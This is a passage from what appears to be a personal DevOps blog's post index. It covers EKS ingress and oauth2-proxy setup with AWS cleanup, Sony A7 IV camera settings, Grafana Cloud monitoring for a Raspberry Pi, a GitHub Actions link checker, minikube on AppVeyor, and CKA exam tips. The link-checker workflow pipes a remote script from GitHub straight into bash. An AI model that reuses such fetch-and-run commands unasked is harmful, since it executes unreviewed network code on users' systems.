(avg(nginx_ingress_controller_ssl_expire_time_seconds) by (host) - time()) &lt; 604800 for: 1s labels: severity: critical annotations: description: ssl certificate(s) will expire in less then a week summary: renew expiring certificates to avoid downtime - alert: NGINXTooMany500s expr: 100 * ( sum( nginx_ingress_controller_requests{status=~\"5.+\"} ) / sum(nginx_ingress_controller_requests) ) &gt; 5 for: 1m labels: severity: warning annotations: description: Too many 5XXs summary: More than 5% of all requests returned 5XX, this requires your attention - alert: NGINXTooMany400s expr: 100 * ( sum( nginx_ingress_controller_requests{status=~\"4.+\"} ) / sum(nginx_ingress_controller_requests) ) &gt; 5 for: 1m labels: severity: warning annotations: description: Too many 4XXs summary: More than 5% of all requests returned 4XX, this requires your attention EOF helm upgrade --install --version \"${INGRESS_NGINX_HELM_CHART_VERSION}\" --namespace ingress-nginx --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx.yml\" ingress-nginx ingress-nginx/ingress-nginx forecastle Forecastle is a control panel that dynamically discovers and provides a launchpad for accessing applications deployed on Kubernetes. Install the forecastle Helm chart and modify its default values: # renovate: datasource=helm depName=forecastle registryUrl=https://stakater.github.io/stakater-charts FORECASTLE_HELM_CHART_VERSION=\"1.0.136\" helm repo add --force-update stakater https://stakater.github.io/stakater-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-forecastle.yml\" &lt;&lt; EOF forecastle: config: namespaceSelector: any: true title: Launch Pad networkPolicy: enabled: true ingress: enabled: true annotations: nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth className: nginx hosts: - host: ${CLUSTER_FQDN} paths: - path: / pathType: Prefix tls: - hosts: - ${CLUSTER_FQDN} EOF helm upgrade --install --version \"${FORECASTLE_HELM_CHART_VERSION}\" --namespace forecastle --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-forecastle.yml\" forecastle stakater/forecastle oauth2-proxy Use OAuth2 Proxy to protect the application endpoints with Google Authentication. Install the oauth2-proxy Helm chart and modify its default values: # renovate: datasource=helm depName=oauth2-proxy registryUrl=https://oauth2-proxy.github.io/manifests OAUTH2_PROXY_HELM_CHART_VERSION=\"6.24.1\" set +x COOKIE_SECRET=\"$(openssl rand -base64 32 | head -c 32 | base64)\" echo \"::add-mask::${COOKIE_SECRET}\" set -x helm repo add --force-update oauth2-proxy https://oauth2-proxy.github.io/manifests tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-oauth2-proxy.yml\" &lt;&lt; EOF config: clientID: ${GOOGLE_CLIENT_ID} clientSecret: ${GOOGLE_CLIENT_SECRET} cookieSecret: ${COOKIE_SECRET} configFile: |- cookie_domains = \".${CLUSTER_FQDN}\" set_authorization_header = \"true\" set_xauthrequest = \"true\" upstreams = [ \"file:///dev/null\" ] whitelist_domains = \".${CLUSTER_FQDN}\" authenticatedEmailsFile: enabled: true restricted_access: |- ${MY_EMAIL} ingress: enabled: true className: nginx hosts: - oauth2-proxy.${CLUSTER_FQDN} tls: - hosts: - oauth2-proxy.${CLUSTER_FQDN} metrics: servicemonitor: enabled: true EOF helm upgrade --install --version \"${OAUTH2_PROXY_HELM_CHART_VERSION}\" --namespace oauth2-proxy --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-oauth2-proxy.yml\" oauth2-proxy oauth2-proxy/oauth2-proxy Clean-up Remove the EKS cluster and its created components: if eksctl get cluster --name=\"${CLUSTER_NAME}\"; then eksctl delete cluster --name=\"${CLUSTER_NAME}\" --force fi Remove the Route 53 DNS records from the DNS Zone: CLUSTER_FQDN_ZONE_ID=$(aws route53 list-hosted-zones --query \"HostedZones[?Name==\\`${CLUSTER_FQDN}.\\`].Id\" --output text) if [[ -n \"${CLUSTER_FQDN_ZONE_ID}\" ]]; then aws route53 list-resource-record-sets --hosted-zone-id \"${CLUSTER_FQDN_ZONE_ID}\" | jq -c '.ResourceRecordSets[] | select (.Type != \"SOA\" and .Type != \"NS\")' | while read -r RESOURCERECORDSET; do aws route53 change-resource-record-sets \\ --hosted-zone-id \"${CLUSTER_FQDN_ZONE_ID}\" \\ --change-batch '{\"Changes\":[{\"Action\":\"DELETE\",\"ResourceRecordSet\": '\"${RESOURCERECORDSET}\"' }]}' \\ --output text --query 'ChangeInfo.Id' done fi Remove any orphan EC2 instances created by Karpenter: for EC2 in $(aws ec2 describe-instances --filters \"Name=tag:kubernetes.io/cluster/${CLUSTER_NAME},Values=owned\" Name=instance-state-name,Values=running --query \"Reservations[].Instances[].InstanceId\" --output text); do echo \"Removing EC2: ${EC2}\" aws ec2 terminate-instances --instance-ids \"${EC2}\" done Remove the CloudWatch log group: if [[ \"$(aws logs describe-log-groups --query \"logGroups[?logGroupName==\\`/aws/eks/${CLUSTER_NAME}/cluster\\`] | [0].logGroupName\" --output text)\" = \"/aws/eks/${CLUSTER_NAME}/cluster\" ]]; then aws logs delete-log-group --log-group-name \"/aws/eks/${CLUSTER_NAME}/cluster\" fi Remove the CloudFormation stack: aws cloudformation delete-stack --stack-name \"${CLUSTER_NAME}-route53\" Wait for all CloudFormation stacks to complete deletion: aws cloudformation wait stack-delete-complete --stack-name \"${CLUSTER_NAME}-route53\" aws cloudformation wait stack-delete-complete --stack-name \"eksctl-${CLUSTER_NAME}-cluster\" Remove volumes and snapshots related to the cluster (as a precaution): for VOLUME in $(aws ec2 describe-volumes --filter \"Name=tag:KubernetesCluster,Values=${CLUSTER_NAME}\" \"Name=tag:kubernetes.io/cluster/${CLUSTER_NAME},Values=owned\" --query 'Volumes[].VolumeId' --output text); do echo \"*** Removing Volume: ${VOLUME}\" aws ec2 delete-volume --volume-id \"${VOLUME}\" done Remove the ${TMP_DIR}/${CLUSTER_FQDN} directory: if [[ -d \"${TMP_DIR}/${CLUSTER_FQDN}\" ]]; then for FILE in \"${TMP_DIR}/${CLUSTER_FQDN}\"/{kubeconfig-${CLUSTER_NAME}.conf,{aws-cf-route53,eksctl-${CLUSTER_NAME},k8s-karpenter-provisioner,helm_values-{aws-node-termination-handler,cert-manager,external-dns,forecastle,ingress-nginx,karpenter,kube-prometheus-stack,mailhog,oauth2-proxy},k8s-cert-manager-{certificate,clusterissuer}-staging}.yml}; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done rmdir \"${TMP_DIR}/${CLUSTER_FQDN}\" fi Enjoy … 😉" }, { "title": "My Sony A7 IV settings", "url": "/posts/my-sony-a7-iv-settings/", "categories": "Photography", "tags": "camera, sony", "date": "2022-09-02 00:00:00 +0200", "content": "I wanted to summarize my notes about the Sony A7 IV settings. Settings are separated into Photo and Video sections. Photo flowchart LR AA1[My Menu \\n Setting] --&gt; AA2(Add Item) --&gt; AA3(Drive Mode) --&gt; AA4(Interval \\n Shoot Func.) AB1[My Menu \\n Setting] --&gt; AB2(Add Item) --&gt; AB3(Drive Mode) --&gt; AB4(Bracket \\n Settings) AC1[My Menu \\n Setting] --&gt; AC2(Add Item) --&gt; AC3(Finder / Monitor) --&gt; AC4(Monitor \\n Brightness) AD1[My Menu \\n Setting] --&gt; AD2(Add Item) --&gt; AD3(Zebra Display) --&gt; AD4(Zebra Display) AE1[My Menu \\n Setting] --&gt; AE2(Add Item) --&gt; AE3(Zebra Display) --&gt; AE4(Bluetooth) --&gt; AE5(Bluetooth \\n Function) AF1[My Menu \\n Setting] --&gt; AF2(Add Item) --&gt; AF3(Finder Monitor) --&gt; AF4(Select \\n Finder/Monitor) AG1[Shooting] --&gt; AG2(Image Quality) --&gt; AG3(JPEG/HEIF Switch) --&gt; AG4(\"HEIF (4:2:0)\") AH1[Shooting] --&gt; AH2(Image Quality) --&gt; AH3(Image Quality \\n Settings) --&gt; AH4(Slot 1) --&gt; AH5(File Format) --&gt; AH6(RAW) AI1[Shooting] --&gt; AI2(Image Quality) --&gt; AI3(Image Quality \\n Settings) --&gt; AI4(Slot 1) --&gt; AI5(RAW \\n File Type) --&gt; AI6(Losseless \\n Comp) AJ1[Shooting] --&gt; AJ2(Image Quality) --&gt; AJ3(Lens \\n Compensation) --&gt; AJ4(Distortion Comp.) --&gt; AJ5(Auto) AK1[Shooting] --&gt; AK2(Media) --&gt; AK3(Rec. Media \\n Settings) --&gt; AK4(Auto Switch Media) AL1[Shooting] --&gt; AL2(File) --&gt; AL3(File/Folder \\n Settings) --&gt; AL4(Set File Name) --&gt; AL5(\"A74\") AM1[Shooting] --&gt; AM2(File) --&gt; AM3(Copyright Info) --&gt; AM4(Write Copyright \\n Info) --&gt; AM5(On) AN1[Shooting] --&gt; AN2(File) --&gt; AN3(Copyright Info) --&gt; AN4(Set Photographer) --&gt; AN5(\"My Name\") AO1[Shooting] --&gt; AO2(File) --&gt; AO3(Copyright Info) --&gt; AO4(Set Copyright) --&gt; AO5(\"CC BY-SA\") AP1[Shooting] --&gt; AP2(File) --&gt; AP3(Write \\n Serial Number) --&gt; AP4(On) AQ1[Shooting] --&gt; AQ2(Drive Mode) --&gt; AQ3(Drive Mode) --&gt; AQ4(Cont. Shooting:) --&gt; AQ5(Mid) AR1[Shooting] --&gt; AR2(Drive Mode) --&gt; AR3(Bracket Settings) --&gt; AR4(\"Selftimer\") --&gt; AR5(2 sec) AS1[Shooting] --&gt; AS2(Drive Mode) --&gt; AS3(Interval Shoot \\n Func.) --&gt; AS4(Shooting \\n start time) --&gt; AS5(2 sec) AT1[Shooting] --&gt; AT2(Drive Mode) --&gt; AT3(Interval Shoot \\n Func.) --&gt; AT4(Shooting interval) --&gt; AT5(5 sec) AU1[Shooting] --&gt; AU2(Drive Mode) --&gt; AU3(Interval Shoot \\n Func.) --&gt; AU4(Shooting interval) --&gt; AU5(Number of shots) --&gt; AU6(300) AV1[Shooting] --&gt; AV2(Drive Mode) --&gt; AV3(Interval Shoot \\n Func.) --&gt; AV4(Shooting interval) --&gt; AV5(AE Tracking \\n Sensitivity) --&gt; AV6(Low) AW1[Exposure/Color] --&gt; AW2(Exposure) --&gt; AW3(ISO Range Limit) --&gt; AW4(50) --&gt; AW5(12800) AX1[Exposure/Color] --&gt; AX2(Metering) --&gt; AX3(Spot Metering Point) --&gt; AX4(Focus Point Link) AY1[Exposure/Color] --&gt; AY2(Zebra Display) --&gt; AY3(Zebra Display) --&gt; AY4(On) AZ1[Exposure/Color] --&gt; AZ2(Zebra Display) --&gt; AZ3(Zebra Level) --&gt; AZ4(C1) --&gt; AZ5(Lower Limit) --&gt; AZ6(109+) BA1[Focus] --&gt; BA2(AF/MF) --&gt; BA3(Focus Mode) --&gt; BA4(Continuous AF) BB1[Focus] --&gt; BB2(AF/MF) --&gt; BB3(AF Illuminator) --&gt; BB4(Off) BC1[Focus] --&gt; BC2(Focus Area) --&gt; BC3(Tracking:) --&gt; BC4(Spot S) BD1[Focus] --&gt; BD2(Focus Area) --&gt; BD3(Focus Area Color) --&gt; BD4(Red) BE1[Focus] --&gt; BE2(Face/Eye AF) --&gt; BE3(Face/Eye Frame Disp.) --&gt; BE4(On) BF1[Focus] --&gt; BF2(Peaking \\n Display) --&gt; BF3(On) BG1[Focus] --&gt; BG2(Peaking \\n Display) --&gt; BG3(Peaking Color) --&gt; BG4(Red) BH1[Playback] --&gt; BH2(Magnification) --&gt; BH3(Enlarge Initial \\n Position) --&gt; BH4(Focused Position) BI1[Playback] --&gt; BI2(Delete) --&gt; BI3(Delete pressing \\n twice) --&gt; BI4(On) BJ1[Playback] --&gt; BJ2(Playback \\n Option) --&gt; BJ3(Focus \\n Frame Display) --&gt; BJ4(On) BK1[Network] --&gt; BK2(Smartphone \\n Connect) --&gt; BK3(Smartphone Regist.) BL1[Network] --&gt; BL2(Smartphone \\n Connect) --&gt; BL3(Remote \\n Shoot Setting) --&gt; BL4(Still Img. \\n Save Dest.) --&gt; BL5(Camera Only) BM1[Network] --&gt; BM2(Transfer \\n Remote) --&gt; BM3(FTP Transfer \\n Func.) --&gt; BM4(FTP Function) --&gt; BM5(On) BN1[Network] --&gt; BN2(Transfer \\n Remote) --&gt; BN3(FTP Transfer \\n Func.) --&gt; BN4(Server \\n Setting) --&gt; BN5(Server 1) --&gt; BN6(...) BO1[Network] --&gt; BO2(Transfer \\n Remote) --&gt; BO3(FTP Transfer \\n Func.) --&gt; BO4(FTP Transfer) --&gt; BO5(Target Group) --&gt; BO6(This Media) BP1[Network] --&gt; BP2(Transfer \\n Remote) --&gt; BP3(FTP Transfer \\n Func.) --&gt; BP4(FTP Power \\n Save) --&gt; BP5(On) BQ1[Network] --&gt; BQ2(Wi-Fi) --&gt; BQ3(Wi-Fi Frequency \\n Band) --&gt; BQ4(2.4 GHz) BR1[Network] --&gt; BR2(Wi-Fi) --&gt; BR3(Access Point \\n Set.) --&gt; BR4(2.4 GHz) BS1[Setup] --&gt; BS2(Operations \\n Customize) --&gt; BS3(Custom Key/Dial \\n Set.) --&gt; BS4(Rear1) --&gt; BS5(4) --&gt; BS6(Shutter/Silent) --&gt; BS7(Switch \\n Silent Mode) BT1[Setup] --&gt; BT2(Operations \\n Customize) --&gt; BT3(Custom Key/Dial \\n Set.) --&gt; BT4(Rear1) --&gt; BT5(2) --&gt; BT6(Image Quality) --&gt; BT7(APS-C S35 \\n Full Frame) BU1[Setup] --&gt; BU2(Operations \\n Customize) --&gt; BU3(Custom Key/Dial \\n Set.) --&gt; BU4(Dial/Wheel) --&gt; BU5(4) --&gt; BU6(Exposure) --&gt; BU7(ISO) BV1[Setup] --&gt; BV2(Operations \\n Customize) --&gt; BV3(Custom Key/Dial \\n Set.) --&gt; BV4(Dial/Wheel) --&gt; BV5(Separate M mode \\n and other modes) BX1[Setup] --&gt; BX2(Operations \\n Customize) --&gt; BX3(Fn Menu Settings) --&gt; BX4(Face/Eye AF) --&gt; BX5(Face/Eye \\n Subject) BY1[Setup] --&gt; BY2(Operations \\n Customize) --&gt; BY3(Fn Menu Settings) --&gt; BY4(Exposure) --&gt; BY5(ISO AUTO Min. SS) BZ1[Setup] --&gt; BZ2(Operations \\n Customize) --&gt; BZ3(Fn Menu Settings) --&gt; BZ4(Zebra Display) --&gt; BZ5(Zebra Display) CA1[Setup] --&gt; CA2(Operations \\n Customize) --&gt; CA3(Fn Menu Settings) --&gt; CA4(White Balance) --&gt; CA5(White Balance) CB1[Setup] --&gt; CB2(Operations \\n Customize) --&gt; CB3(\"DISP (Screen Disp) \\n Set\") --&gt; CB4(Finder) --&gt; CB5(Display All \\n Info.) CC1[Setup] --&gt; CC2(Touch \\n Operation) --&gt; CC3(Touch Operation) --&gt; CC4(On) CD1[Setup] --&gt; CD2(Touch \\n Operation) --&gt; CD3(Touch Panel/Pad) --&gt; CD4(Touch Pad Only) CE1[Setup] --&gt; CE2(Touch \\n Operation) --&gt; CE3(Touch Func. \\n in Shooting) --&gt; CE4(Touch Focus) CF1[Setup] --&gt; CF2(Touch \\n Operation) --&gt; CF3(Touch Pad Settings) --&gt; CF4(Operation Area) --&gt; CF5(Left 1/2) CG1[Setup] --&gt; CG2(Display \\n Option) --&gt; CG3(Auto Review) --&gt; CG4(2s) CH1[Setup] --&gt; CH2(Power Setting \\n Option) --&gt; CH3(Auto Power OFF \\n Temp.) --&gt; CH4(High) CI1[Setup] --&gt; CI2(Sound Option) --&gt; CI3(Audio signals) --&gt; CI4(Off) CJ1[Setup] --&gt; CJ2(Setup Option) --&gt; CJ3(Anti-dust Function) --&gt; CJ4(Shutter When \\n Pwr OFF) --&gt; CJ5(On) CK1[Setup] --&gt; CK2(USB) --&gt; CK3(USB Connection \\n Mode) --&gt; CK4(\"MassStorage(MSC)\") Video flowchart LR A1[Shooting] --&gt; A2(Image Quality) --&gt; A3(File Format) --&gt; A4(XAVC HS 4K) B1[Shooting] --&gt; B2(Image Quality) --&gt; B3(Movie Settings) --&gt; B4(Record Setting) --&gt; B5(140M 4:2:2 10bit) C1[Shooting] --&gt; C2(Image Quality) --&gt; C3(S&amp;Q Settings) --&gt; C4(Frame Rate) --&gt; C5(1fps) D1[Shooting] --&gt; D2(File) --&gt; D3(File Name Format) --&gt; D4(Date + Title) E1[Shooting] --&gt; E2(File) --&gt; E3(File Name Format) --&gt; E4(Title Name \\n Settings) --&gt; E5(A74_) F1[Exposure / Color] --&gt; F2(Color / Tone) --&gt; F3(Picture Profile) --&gt; F4(PP11) G1[Setup] --&gt; G2(Operations \\n Customize) --&gt; G3(Different Set \\n for Still/Mv) --&gt; G4(\"(Select all)\") H1[Setup] --&gt; H2(Operations \\n Customize) --&gt; H3(REC w/ Shutter) --&gt; H4(On) Links: Sony A7IV BEGINNER’S GUIDE to Custom Settings - Part 1 Top 7 Settings to Change on Sony a7 IV Sony A7IV – Best Settings For Photography Sony A7 IV Beginners Guide - Set-Up, Menus, &amp; How-To Use the Camera" }, { "title": "Monitor your Raspberry Pi using Grafana Cloud", "url": "/posts/monitor-your-raspberry-pi-using-grafana-cloud/", "categories": "Linux, DevOps, linux.xvx.cz", "tags": "raspberry-pi, grafana, prometheus, monitoring", "date": "2022-01-06 00:00:00 +0100", "content": "Original post from linux.xvx.cz Recently my SD card in Raspberry Pi died, because I was storing there the Prometheus data used for monitoring. Frequent writes to the SD card probably destroyed it. Anyway I was looking for an alternative to monitor the RPi without running it (Grafana, Prometheus) myself. The Grafana Labs offers Grafana Cloud in free version which is powerful enough to get the monitoring data from your RPi including logs. Here are the steps to configure your Raspberry Pi to use Grafana Cloud: Grafana Cloud Setup Go to Grafana Cloud and create a new account. Select your “Team URL” and region: Then select the “Linux Server” and click “Install integration” I left the “Debian - based” as a default and changed the “Architecture” to “Armv7” Copy the content from the Grafana Agent field and paste it to your shell connected to RPi Then continue by “Test integration and finish installation”: After these steps the Grafana Agent should be configured and should start sending data to Grafana Cloud. Raspberry Pi It will be handy to add a few more features and configure Grafana Agent a little bit… Do the changes in the terminal: # Install blackbox-exporter apt update apt install -y prometheus-blackbox-exporter # Change the grafana agent config file /etc/grafana-agent.yaml cat &gt; /etc/grafana-agent.yaml &lt;&lt; EOF integrations: agent: enabled: true process_exporter: enabled: true process_names: - comm: - grafana-agent - prometheus-blac - systemd node_exporter: enabled: true enable_collectors: - interrupts - meminfo_numa - mountstats - systemd - tcpstat prometheus_remote_write: - basic_auth: password: eyxxxxxxxxxxxxxxxF9 username: 2xxxxxx2 url: https://prometheus-prod-01-eu-west-0.grafana.net/api/prom/push loki: configs: - clients: - basic_auth: password: eyxxxxxxxxxxxxxxxF9 username: 1yyyyyyyy6 url: https://logs-prod-eu-west-0.grafana.net/api/prom/push name: integrations positions: filename: /tmp/positions.yaml target_config: sync_period: 10s scrape_configs: - job_name: system static_configs: - labels: __path__: /var/log/{*log,daemon,messages} job: varlogs targets: - localhost prometheus: configs: - name: agent scrape_configs: - job_name: grafana-agent static_configs: - targets: ['127.0.0.1:12345'] - job_name: blackbox-http_2xx metrics_path: /probe params: module: [http_2xx] static_configs: - targets: - http://192.168.1.1 - https://google.com - https://root.cz relabel_configs: - source_labels: [__address__] target_label: __param_target - source_labels: [__param_target] target_label: instance - target_label: __address__ replacement: 127.0.0.1:9115 - job_name: blackbox-icmp metrics_path: /probe params: module: [icmp] scrape_interval: 5s static_configs: - targets: - 192.168.1.1 - google.com - root.cz relabel_configs: - source_labels: [__address__] target_label: __param_target - source_labels: [__param_target] target_label: instance - target_label: __address__ replacement: 127.0.0.1:9115 remote_write: - basic_auth: password: eyxxxxxxxxxxxxxxxF9 username: 2xxxxxx2 url: https://prometheus-prod-01-eu-west-0.grafana.net/api/prom/push global: scrape_interval: 60s wal_directory: /tmp/grafana-agent-wal server: http_listen_port: 12345 EOF # Change the grafana agent config file /etc/prometheus/blackbox.yml and add preferred protocol cat &gt; /etc/prometheus/blackbox.yml &lt;&lt; EOF modules: http_2xx: prober: http http: preferred_ip_protocol: ip4 tcp_connect: prober: tcp tcp: preferred_ip_protocol: ip4 icmp: prober: icmp icmp: preferred_ip_protocol: ip4 EOF systemctl restart prometheus-blackbox-exporter grafana-agent Then go to the Grafana Cloud again… Grafana Cloud Dashboards Login to Grafana Cloud again and click on Grafana: Click on Import: Import these Dashboards with numbers 13659 - Blackbox Exporter (HTTP prober) 9719 - Decentralized Blackbox Exporter 12412 - ICMP exporter 7587 - Prometheus Blackbox Exporter 4202 - Named processes by host 715 - Named processes stacked 8378 - System Processes Metrics 5984 - Alerts - Linux Nodes 1860 - Node Exporter Full 405 - Node Exporter Server Metrics Do not forget to select the proper prometheus datasource (ends with -prom): After you import the Dashboard you should see them by going to “Dashboards -&gt; Browse”: You can also see the logs from your RPi collected by Loki: The YouTube video showing all the steps can be found here: Enjoy 😉" }, { "title": "Check availability of external links in your web pages", "url": "/posts/check-availability-of-external-links-in-your-web-pages/", "categories": "DevOps, linux.xvx.cz", "tags": "github-actions, automation", "date": "2020-02-02 00:00:00 +0100", "content": "Original post from linux.xvx.cz When you create your web pages in most cases you are using the images, external links, videos which may not be a static part of the web page itself, but it’s stored externally. At the time you wrote your shiny page you probably checked all these external dependencies to be sure it’s working to make your readers happy, because nobody likes to see errors like this: Now the page is working fine with all external dependencies because I checked it properly - but what about in a few months / years / … ? Web pages / images  / videos may disappear from the Internet especially when you can not control them and then it’s handy from time to time to check your web pages if all the external links are still alive. There are many tools which you may install to your PC and check the “validity” of your web pages instead of manually clicking the links. I would like to share how I’m periodically checking my documents / pages using the GitHub Actions. Here is the GitHub Action I wrote for this purpose:  My Broken Link Checker In short you can simply create a git repository in GitHub and store there the file defining which URLs should be checked/verified: git clone git@github.com:ruzickap/check_urls.git cd check_urls || true mkdir -p .github/workflows cat &gt; .github/workflows/periodic-broken-link-checks.yml &lt;&lt; \\EOF name: periodic-broken-link-checks on: schedule: - cron: '0 0 * * *' pull_request: types: [opened, synchronize] paths: - .github/workflows/periodic-broken-link-checks.yml push: branches: - master paths: - .github/workflows/periodic-broken-link-checks.yml jobs: broken-link-checker: runs-on: ubuntu-latest steps: - name: Broken link checker env: INPUT_URL: https://google.com EXCLUDE: | linkedin.com localhost myexample.dev mylabs.dev run: | export INPUT_CMD_PARAMS=\"--one-page-only --verbose --buffer-size=8192 --concurrency=10 --exclude=($( echo ${EXCLUDE} | tr ' ' '|' ))\" wget -qO- https://raw.githubusercontent.com/ruzickap/action-my-broken-link-checker/v1/entrypoint.sh | bash EOF git add . git commit -m \"Add periodic-broken-link-checks\" git push The code above will store the GitHub Action Workflow file into the repository and start checking the https://google.com every midnight (UTC). This is the screencast where you can see it all in action: This URL checker script is based on muffet  and you can set its parameters by changing the INPUT_CMD_PARAMS variable. Feel free to look at more details here: https://github.com/ruzickap/action-my-broken-link-checker I hope this may help you to keep the quality of the web pages by finding the external link errors quickly. Enjoy :-)" }, { "title": "Other posts...", "url": "/posts/other-posts/", "categories": "Kubernetes, Cloud, linux.xvx.cz", "tags": "kubernetes, istio, harbor, flux, amazon-eks", "date": "2019-10-21 00:00:00 +0200", "content": "Original post from linux.xvx.cz It’s been some time since I posted something. Unfortunately I prefer to write some blog posts in Markdown  instead of writing it here. Most of them are related to Kubernetes… Anyway I put some of my notes / articles here: Kubernetes with Istio demo (Presentation) Istio workshop Istio webinar (Presentation) Kubernetes + Harbor (Presentation) Kubernetes + PostgreSQL Kubernetes + Flux + Istio + GitLab + Harbor Kubernetes + Flagger + Flux + Istio Kubernetes + Flagger + Flux + Sockshop Kubernetes + Knative + GitLab + Harbor Kubernetes + Jenkins X + Sock Shop Amazon EKS Bottlerocket and Fargate Amazon EKS and Flux I hope you will find it useful… ;-)" }, { "title": "Running Kubernetes on AppVeyor with minikube", "url": "/posts/running-kubernetes-on-appveyor-with-minikube/", "categories": "Kubernetes, DevOps, linux.xvx.cz", "tags": "kubernetes, automation", "date": "2018-04-20 00:00:00 +0200", "content": "Original post from linux.xvx.cz When I was playing with Kubernetes I made a lot of notes on how to do things. Then I realized it may be handy to put those notes to Github and let them go through some CI to be sure they are correct. I was looking for a way to run Kubernetes via minikube in Travis CI and there are “some” ways: Running Kubernetes on Travis CI with minikube Unfortunately I didn’t have much luck with the latest minikube (0.26) and the latest Kubernetes (1.10) when I tried to make it work on Travis. It looks like there are some problems with running the latest stuff on Travis and people are using older Kubernetes/minikube versions (like here: https://github.com/LiliC/travis-minikube/blob/master/.travis.yml). Instead of troubleshooting Travis CI - I decided to use AppVeyor. It’s another free service like Travis doing basically the same, but it has some advantages: Your build environment is running in VM with 2 x CPU and 8GB of RAM and it can be running for 1 hour (can be extended to 1:30). It supports Ubuntu Xenial 16.04 and Windows images (both with a lot of software preinstalled). You can access the Linux VM via SSH: https://www.appveyor.com/docs/getting-started-with-appveyor-for-linux/#accessing-build-vm-via-ssh. You can also access Windows build (via RDP). AppVeyor was mainly focused on Windows builds, but recently they announced the Linux build support (which is now in beta phase). Anyway, the possibility of using Ubuntu Xenial 16.04 (compared to old Ubuntu Trusty 14.04 in Travis) and SSH access to the VM makes it really interesting for CI. I decided to try to use minikube with AppVeyor - so here is .appveyor.yml sample: image: ubuntu build_script: # Download and install minikube # Download kubectl, which is a requirement for using minikube - curl -sL https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl -o kubectl - chmod +x kubectl - sudo mv kubectl /usr/local/bin/ # Download minikube - curl -sL https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64 -o minikube - chmod +x minikube - sudo mv minikube /usr/local/bin/ - sudo CHANGE_MINIKUBE_NONE_USER=true minikube start --vm-driver=none --memory=4096 # Wait for Kubernetes to be up and ready (https://web.archive.org/web/20171213061419/https://blog.travis-ci.com/2017-10-26-running-kubernetes-on-travis-ci-with-minikube) - JSONPATH='{range .items[*]}{@.metadata.name}:{range @.status.conditions[*]}{@.type}={@.status};{end}{end}'; until kubectl get nodes -o jsonpath=\"$JSONPATH\" 2&gt;&amp;1 | grep -q \"Ready=True\"; do sleep 1; done # Run commands - kubectl get nodes - kubectl get pods --all-namespaces Real example: Github repository: https://github.com/ruzickap/multinode_kubernetes_cluster AppVeyor pipeline: https://ci.appveyor.com/project/ruzickap/multinode-kubernetes-cluster Maybe if you need to test some Kubernetes commands / scripts / etc… you can use minikube and AppVeyor… Enjoy :-)" }, { "title": "CKA - Kubernetes Certified Administrator exam tips", "url": "/posts/cka-kubernetes-certified-administrator-exam-tips/", "categories": "Kubernetes, linux.xvx.cz", "tags": "kubernetes, cka, kubectl", "date": "2018-04-19 00:00:00 +0200", "content": "Original post from linux.xvx.cz I passed the Kubernetes Certified Administrator exam recently and I would like to share some tips. I was looking for some details about the exam before, but most of the articles I found are quite old: https://medium.com/@walidshaari/kubernetes-certified-administrator-cka-43a25ca4c61c https://github.com/walidshaari/Kubernetes-Certified-Administrator https://web.archive.org/web/20180321024730/http://madorn.com/certified-kubernetes-administrator-exam.html https://blog.heptio.com/how-heptio-engineers-ace-the-certified-kubernetes-administrator-exam-93d20af32557 So I decided to write some more fresh stuff from the April 2018. You will have access to one terminal window where you are switching between Kubernetes clusters using “kubectl config use-context “. (Every exercise starts with a command showing you which cluster to use.) Here is how it looks (picture is taken from web.archive.org) When you are doing some cluster troubleshooting it may be useful to know “screen” command and how to work with it. It’s handy when you need to quickly switch between cluster node sessions, because you have only one terminal window. Absolute must is to enable bash completion on the “master station” where you will be running all the kubectl commands. This handy autocomplete will speed up your work significantly - you can enable it by running: &lt;(kubectl completion bash) (https://kubernetes.io/docs/reference/kubectl/cheatsheet/) Examples can be found here: https://blog.heptio.com/kubectl-shell-autocomplete-heptioprotip-48dd023e0bf3 Web console used on the exam has some limitations so be prepared that it’s not as easy to manage as your favorite terminal. See the Exam Handbook how to use Copy &amp; Paste and do not use the bash shortcut “Ctrl + W” for deleting word if you are used to. During the exam I marked some questions which I would like to look at before the exam ends. Actually I didn’t have time to do it - so do not expect that you will have much time left to return to some questions… If you are completely lost with some hard questions - it’s better to skip them or just give them limited amount of time. There is a notepad in your browser available during the exam - so use it for your notes. Be familiar with structure of kubernetes.io and how to search there. This is the only page which can be opened in the second browser tab and you are allowed to use it. You should practice your Kubernetes knowledge on multinode cluster. minikube is very handy to spin up the Kubernetes easily, but it has only single node. All clusters in CKA exam are multinode clusters and you should know how to work with them. Feel free to look at this page how to quickly install the multinode Kubernetes cluster (using kubeadm): “Cheapest Amazon EKS” Other CKA exam details can be found on many blogs / pages / handbooks and I do not want to cover them here. I just point to the most important ones… Enjoy ;-)" }, { "title": "Create Kubernetes Multinode Cluster using multiple VMs", "url": "/posts/create-kubernetes-multinode-cluster-using-multiple-vms/", "categories": "Kubernetes, Virtualization, linux.xvx.cz", "tags": "kubernetes, kubespray", "date": "2018-04-18 00:00:00 +0200", "content": "Original post from linux.xvx.cz If you need to run a single-node Kubernetes cluster for testing then minikube is your choice. But sometimes you need to run tests on a multinode cluster running on multiple VMs. There are many ways to install a Kubernetes Multinode Cluster but I chose these projects kubeadm and kubespray. Kubespray is handy for enterprise installations where HA is a must, but it can be used for standard testing if you have Ansible installed. Kubeadm is the official tool for Kubernetes installation, but it needs more love when you want to use it in enterprise to configure HA. Let’s look at these two projects to see how “easy” it is to install Kubernetes to multiple nodes (VMs): Kubeadm Here are the steps: ### Master node installation # SSH to the first VM which will be your Master node: ssh root@node1 # Set the Kubernetes version which will be installed: KUBERNETES_VERSION=\"1.10.0\" # Set the proper CNI URL: CNI_URL=\"https://raw.githubusercontent.com/coreos/flannel/v0.10.0/Documentation/kube-flannel.yml\" # For Flannel installation you need to use proper \"pod-network-cidr\": POD_NETWORK_CIDR=\"10.244.0.0/16\" # Add the Kubernetes repository (details): apt-get update -qq 